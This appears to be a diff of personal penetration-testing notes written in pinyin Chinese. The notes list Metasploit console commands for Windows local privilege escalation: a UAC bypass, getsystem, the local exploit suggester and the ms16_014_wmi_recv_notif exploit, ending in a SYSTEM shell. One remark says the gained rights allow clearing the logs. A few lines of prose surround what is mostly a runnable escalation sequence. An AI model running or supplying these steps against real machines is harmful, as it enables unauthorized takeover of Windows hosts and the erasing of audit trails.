@@ -61,7 +61,22 @@ use exploit/windows/local/bypassuac
 set SESSION 1
 run
 chenggong dedao  session2 
-getsystem jiu  bu baocuole  yeneng qingrizhi
+getsystem jiu  bu baocuole  yeneng qingrizhi  suiran haishi zhege yonghu  dan quanxian tigaole 
+
+haishi zhege xitong  yong liyizhong fangfa tiquan 
+
+getsystem
+use post/multi/recon/local_exploit_suggester
+set SESSION 1
+show options
+run
+use exploit/windows/local/ms16_014_wmi_recv_notif
+set SESSION 1
+show options
+run
+getsystem zhe ce xianshi shi  Already running as SYSTEM
+
+
 
 surface的win8.1 run vnc屏幕显示不全
 
